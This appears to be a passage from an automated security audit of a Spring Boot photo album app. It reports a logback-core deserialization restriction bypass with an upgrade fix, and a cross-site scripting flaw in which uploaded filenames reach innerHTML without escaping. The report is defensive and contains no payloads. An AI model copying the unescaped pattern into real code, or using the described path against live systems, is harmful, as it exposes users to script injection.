More precisely, an attacker able to influence serialized data sent to SimpleSocketServer or SimpleSSLSocketServer can instantiate objects from classes in the java.lang and java.util packages that are not explicitly blocked.

Although deserialization is heavily restricted by HardenedObjectInputStream and no practical way to achieve remote code execution or significant privilege escalation has been identified, this issue constitutes a bypass of the intended security restrictions.

This issue affects logback: through 1.5.32 inclusive.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: <= 1.5.32
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.5.33 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

## CWE Findings (Code-Level Vulnerabilities)

### CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **Category:** Injection Attacks
- **Severity:** optional
- **Story Points:** 8
- **Files:** src/main/resources/static/js/upload.js, src/main/java/com/photoalbum/controller/HomeController.java, src/main/java/com/photoalbum/service/impl/PhotoServiceImpl.java

PhotoServiceImpl.uploadPhoto preserves MultipartFile.getOriginalFilename() at line 162; HomeController.uploadPhotos returns it as originalFileName at line 77. upload.js createPhotoCard interpolates this value without escaping into attributes and HTML text at lines 185-189, and displayNewPhotos inserts that markup through insertAdjacentHTML at line 157. An administrator who selects an attacker-supplied image with a malicious filename (for example distributed in an archive or shared directory on a filesystem permitting HTML metacharacters) can execute injected event-handler JavaScript in the application's origin. This requires victim interaction; ordinary later gallery visitors receive escaped Thymeleaf output and are not shown to be affected. Error filenames also flow to innerHTML at upload.js:216-218. No runtime exploit test was performed.
